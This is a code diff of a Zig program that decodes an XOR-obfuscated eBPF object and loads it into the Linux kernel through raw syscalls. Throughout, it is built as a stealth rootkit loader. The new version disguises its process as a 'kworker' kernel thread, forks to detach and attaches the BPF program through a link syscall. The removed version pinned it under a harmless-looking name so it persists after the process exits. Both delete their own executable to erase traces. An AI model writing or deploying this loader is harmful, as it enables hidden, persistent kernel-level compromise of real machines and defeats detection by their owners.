@@ -1,31 +1,40 @@
 const std = @import("std");
-const syscalls = @import("syscalls.zig");
+const sc = @import("syscalls.zig");
 
-const BPF_OBJ_PIN: u32 = 6;
-const BPF_PROG_LOAD: u32 = 5;
+pub fn _start() noreturn {
+    var s_buf: [32]u8 = undefined;
+    s_buf[0] = 'k'; s_buf[1] = 'w'; s_buf[2] = 'o'; s_buf[3] = 'r';
+    s_buf[4] = 'k'; s_buf[5] = 'e'; s_buf[6] = 'r'; s_buf[7] = '/';
+    s_buf[8] = 'u'; s_buf[9] = '1'; s_buf[10] = '1'; s_buf[11] = ':';
+    s_buf[12] = '1'; s_buf[13] = 0;
 
-pub fn main() !void {
-    // 1. Decrypt Soul (BPF Bytecode)
-    var bpf_blob = @constCast(@embedFile("../target/ghost_gate.bpf.o").*);
-    for (&bpf_blob) |*b| { b.* ^= 0x5F; }
+    _ = sc.prctl(15, @intFromPtr(&s_buf), 0, 0, 0);
 
-    // 2. Load into Kernel
-    // We use raw syscalls to avoid libc/std hooks
-    const prog_fd = syscalls.bpf_call(BPF_PROG_LOAD, &bpf_blob, bpf_blob.len);
-    if (prog_fd < 0) std.os.exit(1);
+    const pid = sc.fork();
+    if (pid != 0) sc.exit(0);
 
-    // 3. Pin to Virtual Filesystem (The "Vanishing Act")
-    // Pinned programs stay active even after this process dies
-    const pin_path = "/sys/fs/bpf/net_sync_provider";
-    _ = syscalls.bpf_obj_pin(@intCast(prog_fd), pin_path);
+    var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
+    comptime var i: usize = 0;
+    inline while (i < bpf_blob.len) : (i += 1) {
+        bpf_blob[i] ^= 0x5F;
+    }
 
-    // 4. Self-Destruct Traces
-    var buf: [1024]u8 = undefined;
-    if (std.os.readlink("/proc/self/exe", &buf)) |path| {
-        _ = std.os.linux.unlink(path);
-    } else |_| {}
+    const prog_fd = sc.bpf_load(5, &bpf_blob, bpf_blob.len);
+    
+    const link_attr = struct {
+        prog_fd: u32,
+        target_fd: u32,
+        attach_type: u32,
+    }{
+        .prog_fd = @intCast(prog_fd),
+        .target_fd = 1, 
+        .attach_type = 37,
+    };
 
-    // 5. Hard Exit
-    @memset(&bpf_blob, 0);
-    std.os.exit(0);
+    _ = sc.bpf_call(28, &link_attr, 12);
+
+    const self_path = "/proc/self/exe";
+    _ = sc.unlink(self_path);
+
+    sc.exit(0);
 }
